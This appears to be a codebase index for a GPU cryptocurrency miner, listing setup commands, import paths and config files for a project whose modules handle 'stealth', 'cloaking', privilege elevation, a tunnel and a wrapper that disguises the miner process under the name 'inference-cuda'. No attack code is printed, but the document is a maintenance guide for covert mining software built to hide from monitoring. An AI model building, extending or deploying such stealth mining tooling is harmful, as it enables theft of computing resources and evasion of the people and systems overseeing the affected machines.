Codebase Index (app/)

Purpose: A navigable map of the app/ directory with responsibilities, import hints, and configuration/logging guidance. Use this as the first stop to locate modules and understand how they fit together.

Quick Start
- Setup venv: `python -m venv .venv && source .venv/bin/activate && pip install -r requirements.txt`
- Run locally: `PYTHONPATH=. python start_mining.py`
- Docker build/run: `docker build -t opus-gpu-app . && docker run --gpus all --env-file .env --rm opus-gpu-app`

Directory Map
```
app/
├── start_mining.py                     # Main entrypoint; env, logging, GPU process lifecycle
├── mining_environment/                 # Core logic for resources, stealth, orchestration
│   ├── config/                         # Tunables (JSON): resources, thresholds, system params
│   ├── coordination/                   # Hook coordination helpers
│   ├── scripts/                        # Orchestrators, resource manager, logging, profiling, utils
│   └── stealth/                        # Stealth activation and CUDA wrappers (GPU-only)
├── pid_logger/                         # PID tracking, process bridge, and worker utilities
├── inference-cuda                      # GPU binary entry (wrapper target)
├── libmlls-cuda.so                     # CUDA library used by the runtime
├── entrypoint.sh, Dockerfile           # Containerization artifacts
├── requirements.txt                    # Python deps
└── stunnel.conf                        # Optional tunnel config
```

Entrypoint
- `start_mining.py`: Wires env setup, logging, PID logger workers, ResourceManager startup, and launches single- or multi-GPU miners after readiness checks.
  - Import hints:
    - Resource manager: `from mining_environment.scripts.resource_manager import ResourceManager`
    - Logging: `from mining_environment.scripts.logging_config import setup_logging`
    - Module loggers: `from mining_environment.scripts.module_loggers import get_start_mining_logger, log_gpu_plugin_operation`
    - Privileged ops: `from mining_environment.scripts.privileged_operations import get_privileged_manager`
    - Stealth activation: `from mining_environment.stealth.core.stealth_activation_manager import initialize_stealth_activation, cleanup_stealth_activation`
    - PID logger: `from pid_logger import start_worker, log_pid, register_process`

Configuration (mining_environment/config)
- Purpose: All tunables are JSON and loaded by components as needed. Avoid hardcoding values; prefer env vars or JSON.
- Files and intent:
  - `system_params.json`: System-wide behavior defaults; runtime thresholds.
  - `resource_config.json`: Resource usage targets/limits and process-level budgets.
  - `gpu_optimization_config.json`: GPU tuning knobs used by optimization orchestrator.
  - `hardware_optimization.json`: Lower-level hardware hints (e.g., power/clock policies).
  - `environmental_limits.json`: External constraints (cooling, power caps, thermal bounds).
  - `threading_config.json`: Concurrency, intervals, and worker counts.
  - `coordination.json`: Hook/coordination-related toggles and defaults.
- Load pattern: pass config into constructors (e.g., `ConfigModel`) or use targeted JSON reads via utils; do not import JSON as code.

Core Scripts (mining_environment/scripts)
- `logging_config.py`: Unified logging system, `setup_logging(name, file_path, level)`; correlation IDs, rotating handlers, aggregation.
- `module_loggers.py`: Pre-wired, deduplicated loggers for subsystems; prefer these over ad-hoc loggers.
- `logging_compat.py`: Compatibility shims for older logging behaviors.
- `log_deduplication.py`: Wraps loggers to reduce repeated lines.
- `resource_manager.py`: `ResourceManager` singleton, readiness events, PID queue handoffs, cloaking integration, NVML use via `SharedResourceManager`.
- `gpu_resource_monitor.py`: GPU metrics collection and NVML helpers (lightweight monitors).
- `resource_control.py`: Low-level controls and helpers for resource adjustments.
- `gpu_optimization_orchestrator.py`: Coordinates GPU optimization strategies and applies tuning.
- `parallel_strategy_executor.py`: Runs optimization/cloaking strategies in parallel safely.
- `dag_synchronization.py`: Synchronizes DAG-related operations where applicable.
- `performance_profiler.py`: Profiles critical paths and tracks timings.
- `error_management.py`: Central error reporter/handler utilities.
- `error_recovery_coordinator.py`: Recovery flows and backoff policies.
- `cross_process_coordination.py`: Minimal cross-process coordination helpers.
- `strategy_cache.py`: Cache with TTL and intelligent eviction for strategy results.
- `cloak_strategies.py`: Cloaking strategy coordinator and implementations.
- `stealth_monitor.py`: Observes stealth/covert operations and signals anomalies.
- `log_rotation_guard.py`: Protects from log spam; ensures rotation boundaries.
- `log_deduplication.py`: Log line coalescing utilities.
- `gpu_monitoring_dashboard.py`: Optional dashboard hooks for GPU metrics.
- `setup_env.py`: Centralized environment setup; validates env, paths, and preflight checks.
- `privileged_operations.py`: Privilege elevation helper and security context checks; validate changes carefully.
- `utils.py`: Shared dataclasses (e.g., `MiningProcess`, `CloakRequest`), helpers, and small utilities.
- `auxiliary_modules/`:
  - `interfaces.py`: Interfaces like `IResourceManager` used for inversion of control.
  - `models.py`: Data/config models such as `ConfigModel`.

Stealth (mining_environment/stealth)
- `core/stealth_activation_manager.py`: Initialize/cleanup stealth activation contexts.
- `wrappers/stealth_inference_cuda.py`: GPU-only stealth wrapper around `inference-cuda`; adds process disguise, signal handling, and logging.
- `plugins/`: Namespace for external/add-on stealth capabilities.

Coordination (mining_environment/coordination)
- `coordinator.py`: Hook coordinator; exported via `get_hook_coordinator`.

PID Logger (pid_logger)
- Purpose: Track PIDs and stream process runtime output into dedicated logs; bridge miner processes to ResourceManager via a direct registry.
- Modules:
  - `worker.py`: Starts PID writer and real-time output monitor threads; queues PID entries; writes `pid_gpu.log` and runtime output.
  - `direct_registry.py`: In-process registry for PIDs; supports handoff to `ResourceManager` and diagnostics.
  - `mining_output_bridge.py`: Bridge utilities for output and registration flows.
  - `__init__.py`: Public API surface: `start_worker`, `log_pid`, `register_process`, diagnostics helpers, and direct-registry accessors.
- Import hint: `from pid_logger import start_worker, register_process`

Runtime Artifacts
- `inference-cuda`, `libmlls-cuda.so`: GPU miner binary and CUDA library used by wrappers; invoked by `stealth_inference_cuda.py`.
- `entrypoint.sh`, `Dockerfile`: Container entry and build; ensure `--gpus all` and required env in `.env`.
- `stunnel.conf`: Optional tunnel; validate carefully before deploy.

Logging Best Practices
- Always prefer module loggers from `mining_environment.scripts.module_loggers`.
- Do not instantiate ad-hoc loggers with custom handlers; use `setup_logging` only if a new dedicated logger is warranted.
- Set `LOGS_DIR` to control log location. Rotation is handled by the unified logging system.

Configuration Best Practices
- Never hardcode thresholds or limits; read from JSON in `mining_environment/config` or environment variables.
- Document any new config keys inside PR descriptions and update this index when adding or changing JSON files.

GPU Runtime Assumptions
- NVIDIA drivers present; container runs with `--gpus all`.
- `CUDA_COMMAND`, `MINING_SERVER_GPU`, and `MINING_WALLET_GPU` must be set.

Common Imports Quick Reference
- Resource manager: `from mining_environment.scripts.resource_manager import ResourceManager`
- Module logger: `from mining_environment.scripts.module_loggers import get_gpu_resource_manager_logger`
- Stealth activation: `from mining_environment.stealth.core.stealth_activation_manager import initialize_stealth_activation`
- PID tools: `from pid_logger import start_worker, register_process`

Maintenance Notes
- Keep new modules small and cohesive; place orchestration under `mining_environment/scripts` and low-level wrappers under `mining_environment/stealth/wrappers`.
- Add a short docstring at the top of every new module describing role and key entrypoints.
- When adding GPU features, document driver/CUDA assumptions in PRs and update this index accordingly.
